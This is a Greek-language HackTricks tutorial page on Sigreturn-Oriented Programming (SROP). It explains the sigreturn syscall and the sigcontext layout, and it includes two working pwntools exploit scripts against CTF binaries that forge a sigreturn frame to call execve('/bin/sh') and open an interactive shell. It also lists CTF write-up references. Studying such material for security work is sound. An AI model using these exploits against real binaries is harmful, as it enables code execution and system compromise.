# SROP - Προγραμματισμός Επιστροφής Σήματος

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα αποθετήρια του [**HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Βασικές Πληροφορίες

Το **`Sigreturn`** είναι ένα ειδικό **syscall** που χρησιμοποιείται κυρίως για τον καθαρισμό μετά την ολοκλήρωση ενός χειριστή σήματος. Τα σήματα είναι διακοπές που στέλνονται σε ένα πρόγραμμα από το λειτουργικό σύστημα, συχνά για να υποδείξουν ότι έχει συμβεί κάποια εξαιρετική κατάσταση. Όταν ένα πρόγραμμα λαμβάνει ένα σήμα, παύει προσωρινά την τρέχουσα εργασία του για να χειριστεί το σήμα με ένα **χειριστή σήματος**, μια ειδική λειτουργία σχεδιασμένη για να αντιμετωπίζει τα σήματα.

Μετά την ολοκλήρωση του χειριστή σήματος, το πρόγραμμα πρέπει να **επαναφέρει την προηγούμενη κατάστασή του** ως να μην συνέβη τίποτα. Εδώ είναι που εμφανίζεται το **`sigreturn`**. Βοηθά το πρόγραμμα να **επιστρέψει από το χειριστή σήματος** και επαναφέρει την κατάσταση του προγράμματος καθαρίζοντας το πλαίσιο στοίβας (το τμήμα μνήμης που αποθηκεύει κλήσεις συναρτήσεων και τοπικές μεταβλητές) που χρησιμοποιήθηκε από το χειριστή σήματος.

Το ενδιαφέρον μέρος είναι πώς το **`sigreturn`** επαναφέρει την κατάσταση του προγράμματος: το κάνει αυτό αποθηκεύοντας **όλες τις τιμές των καταχωρητών της CPU** στη στοίβα. Όταν το σήμα δεν είναι πλέον μπλοκαρισμένο, το **`sigreturn`** απομαγνητίζει αυτές τις τιμές από τη στοίβα, επαναφέροντας αποτελεσματικά τους καταχωρητές της CPU στην κατάστασή τους πριν το χειρισμό του σήματος. Αυτό περιλαμβάνει τον καταχωρητή δείκτη στοίβας (RSP), που δείχνει στην τρέχουσα κορυφή της στοίβας.

{% hint style="danger" %}
Καλώντας το syscall **`sigreturn`** από μια ROP αλυσίδα και **προσθέτοντας τις τιμές των καταχωρητών** που θα θέλαμε να φορτώσει στη **στοίβα**, είναι δυνατό να **ελέγξουμε** όλες τις τιμές των καταχωρητών και συνεπώς να **καλέσουμε** για παράδειγμα το syscall `execve` με `/bin/sh`.
{% endhint %}

Σημειώστε πώς αυτό θα ήταν ένας **τύπος Ret2syscall** που καθιστά πολύ πιο εύκολο τον έλεγχο των παραμέτρων για να καλέσει άλλα Ret2syscalls:

{% content-ref url="rop-syscall-execv/" %}
[rop-syscall-execv](rop-syscall-execv/)
{% endcontent-ref %}

Αν είστε περίεργοι, αυτή είναι η δομή **sigcontext** που αποθηκεύεται στη στοίβα για να ανακτήσει αργότερα τις τιμές (διάγραμμα από [**εδώ**](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)):
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
Για μια καλύτερη εξήγηση, ελέγξτε επίσης:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Παράδειγμα

Μπορείτε να [**βρείτε ένα παράδειγμα εδώ**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop) όπου η κλήση στο signeturn κατασκευάζεται μέσω ROP (βάζοντας στο rxa την τιμή `0xf`), αν και αυτή είναι η τελική εκμετάλλευση από εκεί:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
Ελέγξτε επίσης το [**exploit από εδώ**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html) όπου το δυαδικό αρχείο καλούσε ήδη το `sigreturn` και επομένως δεν χρειάζεται να κατασκευάσετε ένα **ROP**:
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## Άλλα Παραδείγματα & Αναφορές

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* Αρχείο με Assembly που επιτρέπει την **εγγραφή στη στοίβα** και στη συνέχεια καλεί την κλήση συστήματος **`sigreturn`**. Είναι δυνατόν να γραφτεί στη στοίβα ένα [**ret2syscall**](rop-syscall-execv/) μέσω μιας δομής **sigreturn** και να διαβαστεί η σημαία που βρίσκεται μέσα στη μνήμη του αρχείου.
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* Αρχείο με Assembly που επιτρέπει την **εγγραφή στη στοίβα** και στη συνέχεια καλεί την κλήση συστήματος **`sigreturn`**. Είναι δυνατόν να γραφτεί στη στοίβα ένα [**ret2syscall**](rop-syscall-execv/) μέσω μιας δομής **sigreturn** (το αρχείο περιέχει τη συμβολοσειρά `/bin/sh`).
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* 64 bits, χωρίς relro, χωρίς canary, nx, χωρίς pie. Απλή υπερχείλιση buffer κατάχρησης της λειτουργίας `gets` με έλλειψη gadgets που εκτελούν ένα [**ret2syscall**](rop-syscall-execv/). Η ROP αλυσίδα γράφει το `/bin/sh` στο `.bss` καλώντας ξανά τη gets, καταχρώνται τη λειτουργία **`alarm`** για να ορίσουν το eax σε `0xf` για να καλέσουν ένα **SROP** και να εκτελέσουν ένα κέλυφος.
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* Πρόγραμμα συναρμολόγησης 64 bits, χωρίς relro, χωρίς canary, nx, χωρίς pie. Η ροή επιτρέπει την εγγραφή στη στοίβα, τον έλεγχο πολλών καταχωρητών και την κλήση ενός συστήματος και στη συνέχεια καλεί την `exit`. Η επιλεγμένη κλήση συστήματος είναι ένα `sigreturn` που θα ορίσει καταχωρητές και θα μετακινήσει το `eip` για να καλέσει μια προηγούμενη εντολή συστήματος και να εκτελέσει το `memprotect` για να ορίσει το χώρο του αρχείου σε `rwx` και να ορίσει το ESP στο χώρο του αρχείου. Ακολουθώντας τη ροή, το πρόγραμμα θα καλέσει ξανά το read στο ESP, αλλά σε αυτήν την περίπτωση το ESP θα δείχνει στην επόμενη εντολή, οπότε περνώντας ένα shellcode θα το γράψει ως την επόμενη εντολή και θα το εκτελέσει.
